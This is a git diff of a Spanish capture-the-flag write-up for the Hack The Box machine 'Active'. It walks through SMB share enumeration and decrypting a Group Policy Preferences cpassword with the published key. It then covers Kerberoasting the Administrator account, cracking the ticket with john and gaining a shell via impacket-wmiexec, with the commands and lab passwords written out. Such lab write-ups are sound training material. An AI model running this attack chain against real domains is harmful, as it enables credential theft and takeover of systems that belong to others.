@@ -1,7 +1,9 @@
-ip -> 10.10.10.100
+10.10.10.100 - Active
+---------------------
+![Active](https://user-images.githubusercontent.com/96772264/202671425-74af675c-48ed-4cd1-ae14-5118d4d503c0.png)
 
-Ports
------
+# Part 1: Enumeración del sistema
+
 ```console
 └─$ nmap -T5 -Pn -v 10.10.10.100 # -> 53,88,139,135,389,445,464,593,636,3269,3268,5722,9389
 └─$ nmap -sCV -T5 10.10.10.100 -Pn -v -p389,445,464,593,636,3269,3268,5722,9389
@@ -16,45 +18,30 @@ Ports
 9389/tcp open  mc-nmf        .NET Message Framing
 ```
 
-Tenemos un directorio activo por los puertos que hemos encontrado, pero lo mejor será encontrar primero algún 
-usaurio para empezar.
+Tenemos un directorio activo por los puertos que hemos encontrado, pero lo mejor será encontrar primero algún usaurio para empezar.  
+ - Aunque tengamos el puerto 135 no hay mucha suerte: ```rpcclient -U "" 10.10.10.100 -N # NT_STATUS_ACCESS_DENIED```  
+ - El puerto 53, no encontramos nada revelavente con el comando **dig**  
 
-Aunque tengamos el puerto 135 no hay mucha suerte:
+-----------------------------------------------
+# Part 2: Obteniendo la clave gpp de un usaurio
 
-```console
-└─$ rpcclient -U "" 10.10.10.100 -N
-rpcclient $> enumdomusers # ->  NT_STATUS_ACCESS_DENIED
-```
-
-Puerto 53
----------
-El comando dig no me ha reportado ninguna informacion relevante.
-
-Puerto 445 (SMB)
-----------------
-
-Investigando, si pone que esta Firmado (signing:True) no se podrán hacer ataques SMBrelays
+Tenemos el puerto 445 (smb) del que podemos obtener archivos:
 ```console
 └─$ crackmapexec smb 10.10.10.100
 SMB   10.10.10.100  445  DC  [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True)
+# Si pone que esta Firmado (signing:True) no se podrán hacer ataques SMBrelays
 └─$ smbclient -L //10.10.10.100/ -N
-	Sharename       Type      Comment
-	---------       ----      -------
-	ADMIN$          Disk      Remote Admin
-	C$              Disk      Default share
-	IPC$            IPC       Remote IPC
 	NETLOGON        Disk      Logon server share 
 	Replication     Disk      
 	SYSVOL          Disk      Logon server share 
 	Users           Disk      
 └─$ smbclient //10.10.10.100/Replication -N
 Anonymous login successful
-Try "help" to get a list of possible commands.
 smb: \> RECURSE ON
 smb: \> PROMPT OFF
 smb: \> mget *
 ```
-Nos ha creado la carpeta Active.htb con todos los recursos.
+Nos ha creado la carpeta Active.htb con todos los recursos:
 
 ```console
 └─$ tree 
@@ -88,14 +75,15 @@ Nos ha creado la carpeta Active.htb con todos los recursos.
 │       └── USER
 └── scripts
 ```
-Hay un montón de cosas, pero el recurso "Groups.xml" es lo critico. Que esté este recurso significa que esto es
-una copia del SYSVOL (al original no teniamos acceso pero a esto si). En este archivo está la contraseña 
-encriptada del administrador del sistema, (la encriptacion es AES-256, un algoritmo muy fuerte).
-El asunto esque si tenemos el hash (cpassword) en el groups.xml podemos romper dicho hash muy rapidamente con el 
-cmando gpp ya que microsoft publico la clave de dicho algoritmo en 2012. 
-> Algoritmo -> llave (en el script gpp-decrypt) + texto cifrado -> texto_descrifrado    
->  key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"    
->  texto_crifrado = campo cpassword del Groups.xml  
+Hay un montón de cosas, pero el recurso **"Groups.xml"** es lo critico. Que esté este recurso significa que esto es una copia del SYSVOL
+(al original no teniamos acceso pero a esto si). En este archivo está la contraseña encriptada del administrador del sistema, 
+(la encriptacion es AES-256, un algoritmo muy fuerte).
+
+El asunto esque si tenemos el hash (cpassword) en el groups.xml podemos romper dicho hash muy rapidamente con el cmando gpp ya que microsoft publico la clave de
+dicho algoritmo en 2012:
+>  Algoritmo -> llave (en el script gpp-decrypt) + texto cifrado -> texto_descrifrado      
+>  key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"      
+>  texto_crifrado = campo cpassword del Groups.xml    
 
 ```console
 └─$ cd /Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
@@ -106,17 +94,19 @@ userName="active.htb\SVC_TGS" # -> Para este usario
 └─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 GPPstillStandingStrong2k18  # Esto es la contraseña
 ```
-Vamos a validar este usario 
+
+Vamos a validar este usario:
 ```
 └─$ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
 SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
 SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStro
 ```
-
 Con SMBmap puede acceder ahora con credenciales, a la user.txt 
 ```console
 └─$ smbmap -H 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18" --download Users/SVC_TGS/Desktop/user.txt
 ```
+-----------------------------------------------
+# Part 3: Enumeración de usaurios RPC
 
 Ahora podemos acceder al rpc porque ya tenemos creds.
 ```console
@@ -138,13 +128,16 @@ index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-
 index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
 index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS	Name: SVC_TGS	Desc: (null)
 ```
+
+-----------------------------------------------
+# Part 4: Obteniendo el hash del admin por kerberos
+
 Nada interesante, ahora hay que probar con el puerto 88 (kerberos)
 
 ```console
 └─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
 active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
-
-# Todo el hash
+-------- # Todo el hash del admin # ---------------------------
 └─$ john hash -w=/usr/share/wordlists/rockyou.txt 
 Ticketmaster1968 (?)
 └─$ impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.10.10.100
